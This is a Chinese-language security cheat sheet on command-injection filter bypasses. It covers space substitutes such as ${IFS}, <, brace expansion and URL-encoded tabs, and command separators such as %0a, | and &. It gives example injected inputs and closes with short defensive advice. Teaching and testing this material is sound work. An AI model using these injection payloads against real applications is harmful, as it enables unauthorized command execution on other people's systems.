## 常用的空格绕过方法

在渗透测试和安全研究中，经常需要绕过各种过滤机制。以下是一些常用的空格绕过方法：

### 基本绕过技术

> `$IFS`
>
> `IFS*6 ——后面的数字6换成其他数字也行`
>
> `${IFS}`
>
> `<`
>
> `<>`
>
> `{cat,flag.php} ——这里把，替换成了空格键`
>
> `%20 ——代表space键`
>
> `%09 ——代表Tab键`

### IFS详解

- **概念**：IFS（Internal Filed Separator，内部域分隔符）是一个 set 变量（shell 变量），**默认是空格、Tab 键、换行符**，使用 for 循环读取值列表时，会根据 IFS 的值判断列表中值的个数。

- **特性**：IFS 的多个值之间是"或"的关系

## 命令分隔符详解

### 通用分隔符

这些分隔符在Windows和Linux系统中都可以使用：

#### 1. `%0a` (换行符)
- **作用**：URL编码的换行符，可以用来分隔命令
- **示例**：`command1%0acommand2`
- **应用场景**：在Web应用中绕过命令注入过滤

#### 2. `|` (管道符)
- **作用**：将前一个命令的输出作为后一个命令的输入
- **示例**：`dir | findstr "test"`
- **特点**：无论前一个命令是否成功执行，都会执行后一个命令

#### 3. `&` (AND操作符)
- **作用**：顺序执行多个命令
- **示例**：`command1 & command2`
- **特点**：无论前一个命令是否成功，都会执行后一个命令

#### 4. `;` (分号)
- **作用**：命令分隔符，顺序执行
- **示例**：`command1; command2`
- **注意**：在Windows CMD中支持有限

### Windows特有命令

#### `dir` 命令
- **作用**：列出目录内容
- **常用参数**：
  - `/a`：显示所有文件（包括隐藏文件）
  - `/s`：递归显示子目录
  - `/b`：简洁格式显示

## 实际应用示例

### 命令注入绕过

```bash
# 使用管道符
ping 127.0.0.1 | dir

# 使用AND操作符
ping 127.0.0.1 & dir

# 使用换行符（URL编码）
ping 127.0.0.1%0adir
```

### 空格绕过示例

```bash
# 使用IFS变量
cat${IFS}flag.txt

# 使用重定向符号
cat<flag.txt

# 使用花括号
{cat,flag.txt}

# 使用URL编码
cat%20flag.txt
cat%09flag.txt
```

## 安全防护建议

### 输入验证
1. **白名单过滤**：只允许预定义的安全字符
2. **黑名单过滤**：过滤危险的特殊字符
3. **长度限制**：限制输入长度

### 命令执行防护
1. **避免直接执行用户输入**
2. **使用参数化查询**
3. **最小权限原则**
4. **沙箱环境**

### 检测方法
```bash
# 检测命令注入
echo "test" | findstr "|"
echo "test" | findstr "&"
echo "test" | findstr "%0a"
```
